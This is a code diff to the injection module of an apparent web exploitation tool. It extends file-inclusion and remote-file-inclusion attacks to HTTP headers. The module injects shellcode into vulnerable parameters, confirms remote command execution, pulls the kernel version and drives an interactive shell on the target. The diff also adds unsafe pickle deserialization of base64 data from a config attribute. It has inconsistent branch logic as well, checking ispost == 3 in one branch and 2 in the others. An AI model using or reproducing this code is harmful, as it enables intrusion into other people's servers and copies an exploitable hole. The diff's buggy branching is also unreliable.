@@ -17,6 +17,8 @@
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 #
+from base64 import b64decode
+import pickle
 import base64
 import shutil
 import os
@@ -60,9 +62,14 @@ class codeinjector(baseClass):
         paramvalue = vuln.getAttribute("paramvalue")
         kernel = domain.getAttribute("kernel")
         postdata = vuln.getAttribute("postdata")
-        ispost = vuln.getAttribute("ispost") == "1"
+        ispost = int(vuln.getAttribute("ispost"))
         language = vuln.getAttribute("language")
         isUnix = vuln.getAttribute("os") == "unix"
+        
+        vulnheaderkey           = vuln.getAttribute("header_vuln_key")
+        header_dict_b64         = vuln.getAttribute("header_dict")
+        header_dict_pickle      = b64decode(header_dict_b64) 
+        header_dict             = pickle.loads(header_dict_pickle)
         
         if (not isUnix and shcode[1]==":"):
             shcode = shcode[3:]
@@ -74,10 +81,14 @@ class codeinjector(baseClass):
         
         if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
-        if (not ispost):
+        if (ispost == 0):
             path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
-        else:
+        elif (ispost == 1):
             postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+        elif (ispost == 2):
+            tmp = header_dict[vulnheaderkey]
+            tmp = tmp.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            header_dict[vulnheaderkey] = tmp
         php_inject_works = False
         sys_inject_works = False
         working_shell    = None
@@ -101,16 +112,25 @@ class codeinjector(baseClass):
         elif (mode.find("R") != -1):
             if settings["dynamic_rfi"]["mode"] == "ftp":
                 self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
-                if (not ispost):
+                if (ispost == 0):
                     url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
-                else:
+                elif (ispost == 1):
                     postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                elif (ispost == 3):
+                    tmp = header_dict[vulnheaderkey]
+                    tmp = tmp.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    header_dict[vulnheaderkey] = tmp
+                    
             elif settings["dynamic_rfi"]["mode"] == "local":
                 self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
-                if (not ispost):
+                if (ispost == 0):
                     url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
-                else:
+                elif (ispost == 1):
                     postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                elif (ispost == 2):
+                    tmp = header_dict[vulnheaderkey]
+                    tmp = tmp.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    header_dict[vulnheaderkey] = tmp
             else:
                 print "fimap is currently not configured to exploit RFI vulnerabilities."
                 sys.exit(1)
@@ -120,7 +140,7 @@ class codeinjector(baseClass):
         php_test_code = quiz
         php_test_result = answer
 
-        code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix)
+        code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
         if code == None:
             self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
             sys.exit(1)
@@ -141,11 +161,11 @@ class codeinjector(baseClass):
                         testload = item.generatePayload(shell_test_code)
                         if (mode.find("A") != -1):
                             self.setUserAgent(testload)
-                            code = self.doPostRequest(url, postdata)
+                            code = self.doPostRequest(url, postdata, header_dict)
                         elif (mode.find("P") != -1):
                             if (postdata != ""):
                                 testload = "%s&%s" %(postdata, testload)
-                            code = self.doPostRequest(url, testload)
+                            code = self.doPostRequest(url, testload, header_dict)
                         elif (mode.find("R") != -1):
                             code = self.executeRFI(url, postdata, suffix, testload)
                         elif (mode.find("L") != -1):
@@ -153,7 +173,7 @@ class codeinjector(baseClass):
                             testload = "data=" + base64.b64encode(testload)
                             if (postdata != ""):
                                 testload = "%s&%s" %(postdata, testload)
-                            code = self.doPostRequest(url, testload)
+                            code = self.doPostRequest(url, testload, header_dict)
                         if code != None and code.find(shell_test_result) != -1:
                             sys_inject_works = True
                             working_shell = item
@@ -161,7 +181,7 @@ class codeinjector(baseClass):
                             if (kernel == None):
                                 self._log("Requesting kernel version...", self.LOG_DEBUG)
                                 uname_cmd = item.generatePayload(xml2config.getKernelCode(isUnix))
-                                kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix).strip()
+                                kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix, headerDict=header_dict).strip()
                                 self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                                 domain.setAttribute("kernel", kernel)
                                 self.saveXML()
@@ -217,7 +237,7 @@ class codeinjector(baseClass):
                             commands.append(ls_cmd)
                             
                         pwd_cmd = item.generatePayload(xml2config.concatCommands(commands, isUnix))
-                        tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
+                        tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
                         curdir = tmp.split("\n")[0].strip()
                         curusr = tmp.split("\n")[1].strip()
                         
@@ -245,13 +265,13 @@ class codeinjector(baseClass):
                                     commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd)
                                     cmds = xml2config.concatCommands(commands, isUnix)
                                     userload = item.generatePayload(cmds)
-                                    code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
+                                    code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix, headerDict=header_dict)
                                     if (cmd.startswith("cd ")):
                                         # Get Current Directory...
                                         commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
                                         cmds = xml2config.concatCommands(commands, isUnix)
                                         cmd = item.generatePayload(cmds)
-                                        curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
+                                        curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                         
                                         # Refresh Tab-Complete Cache...
                                         if (ls_cmd != None):
@@ -259,7 +279,7 @@ class codeinjector(baseClass):
                                             commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), ls_cmd)
                                             cmds = xml2config.concatCommands(commands, isUnix)
                                             cmd = item.generatePayload(cmds)
-                                            tab_cache = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
+                                            tab_cache = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                             if (ls_cmd != None):
                                                 dir_content = ",".join(tab_cache.split("\n"))
                                                 tab_choice = []
@@ -288,7 +308,7 @@ class codeinjector(baseClass):
                         shellcode = item.generatePayload(cpayload)
 
 
-                    code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix)
+                    code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix, headerDict=header_dict)
                     if (code == None):
                         print "Exploiting Failed!"
                         sys.exit(1)
@@ -311,7 +331,7 @@ class codeinjector(baseClass):
                         else:
                             postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                         url = "http://%s%s" %(hostname, path)
-                        code = self.__doHaxRequest(url, postdata, mode, "", langClass, appendix, False)
+                        code = self.__doHaxRequest(url, postdata, mode, "", langClass, appendix, False, headerDict=header_dict)
                         print "--- Unfiltered output starts here ---"
                         print code
                         print "--- EOF ---"
@@ -334,10 +354,10 @@ class codeinjector(baseClass):
             print "Failed to test injection. :("
 
 
-    def _doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True):
-        return(self.__doHaxRequest(url, postdata, m, payload, langClass, appendix, doFilter))
+    def _doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
+        return(self.__doHaxRequest(url, postdata, m, payload, langClass, appendix, doFilter, headerDict=headerDict))
 
-    def __doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True):
+    def __doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
         code = None
         rndStart = self.getRandomStr()
         rndEnd = self.getRandomStr()
@@ -350,10 +370,10 @@ class codeinjector(baseClass):
             
         if (m.find("A") != -1):
             self.setUserAgent(userload)
-            code = self.doPostRequest(url, postdata)
+            code = self.doPostRequest(url, postdata, additionalHeaders = headerDict)
         elif (m.find("P") != -1):
             if (postdata != ""): userload = "%s&%s" %(postdata, userload)
-            code = self.doPostRequest(url, userload)
+            code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
         elif (m.find("R") != -1):
             code = self.executeRFI(url, postdata, appendix, userload)
         elif (m.find("L") != -1):
@@ -374,7 +394,7 @@ class codeinjector(baseClass):
                         tmpurl = url[:url.find("?")]
                     else:
                         tmpurl = url
-                    self.doGetRequest(tmpurl)
+                    self.doGetRequest(tmpurl, additionalHeaders = headerDict)
                     self.setUserAgent(ua)
                     
                     self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
@@ -382,7 +402,7 @@ class codeinjector(baseClass):
                     p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                     if (postdata != ""):
                         p = "%s&%s" %(postdata, p)
-                    code = self.doPostRequest(url, p)
+                    code = self.doPostRequest(url, p, additionalHeaders = headerDict)
 
                     if (code.find(testcode[1]) == -1):
                         self._log("Failed to inject kickstarter!", self.LOG_ERROR)
@@ -400,7 +420,7 @@ class codeinjector(baseClass):
                 userload = "data=" + base64.b64encode(userload)
                 if (postdata != ""):
                     userload = "%s&%s" %(postdata, userload)
-                code = self.doPostRequest(url, userload)
+                code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
         if (code != None): 
             if doFilter:
                 code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
